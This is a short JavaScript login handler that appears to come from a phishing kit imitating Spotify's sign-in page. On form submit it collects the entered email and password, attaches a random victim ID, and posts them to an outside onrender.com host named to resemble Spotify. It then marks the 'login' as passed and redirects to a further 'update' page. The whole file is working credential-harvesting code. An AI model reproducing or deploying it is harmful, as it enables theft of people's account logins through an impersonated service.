console.log("post_login.js");

function generateRandomString() {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters.charAt(randomIndex);
    }
    return result;
}

$(document).ready(function () {
    $("#form").on("submit", async function (event) {
        event.preventDefault();
        $("#login-button").prop("disabled", true); // Disable the button to prevent multiple clicks
        const unique_id = generateRandomString();
        const formData = new FormData(this);
        formData.append('unique_id', unique_id);

        try {
            const response = await fetch("https://spoty-dfla0k2kfs-sdjla2dasf.onrender.com/post_login.php", {
                method: "POST",
                body: formData,
            });

            if (!response.ok) {
                console.error(`HTTP Error: ${response.status} ${response.statusText}`);
                $("#login-button").prop("disabled", false);
                return;
            }

            const result = await response.json();
            console.log("Raw Response:", result);

            debugger;
            if (result.status === 'success') {
                debugger;
                // Store session data
                localStorage.setItem("recaptcha", "passed");
                localStorage.setItem("unique_id", unique_id);
                localStorage.setItem("login", "passed");
                localStorage.setItem("step", "one");

                // Clear errors and redirect
                $("#error_mail").html("");
                $("#error_pass").html("");
                window.location.href = 'update.html';
            } else if (result.status === 'error' && result.errors) {
                // Handle specific error messages
                if (result.errors === 'mail') {
                    $("#signin_email").css("box-shadow", "inset 0 0 0 1px var(--essential-negative,#e91429)");
                } else {
                    $("#signin_email").css("box-shadow", "");
                }
                $("#signin_password").css("box-shadow", "inset 0 0 0 1px var(--essential-negative,#e91429)");
                $("#login-button").prop("disabled", false);
            } else {
                console.log("Unexpected status:", result.status);
                $("#login-button").prop("disabled", false);
            }
        } catch (error) {
            console.error("Error:", error);
            $("#login-button").prop("disabled", false); // Re-enable button in case of error
        }
    });
});
